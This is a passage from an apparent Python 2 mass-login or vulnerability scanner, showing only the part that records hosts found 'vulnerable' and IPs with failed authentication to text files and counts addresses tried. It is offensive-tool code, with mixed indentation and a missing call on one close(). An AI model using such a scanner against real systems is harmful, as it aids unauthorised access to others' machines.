				elif status == 5:
					print "Too many failures"
								
				print (listnew)
				gecenzaman=clock() - startingtime
				print (gecenzaman)
				resclients=open("vulnerables.txt", "w")
				resclients.write(pprint.pformat(listnew) + '\n')
				resclients.close()
				
				authfailones=open("AuthFailedIPs.txt", "w")
				authfailones.write(pprint.pformat(listauthfails) + '\n')
				authfailones.close
				
                                t=t+1
                                print str(t) + " of the IP addresses have been tried."
                                if t==s:
                                        print "The task has been finished because number of process reached the stated page number."
                                        exit()
                                else:
                                        pass
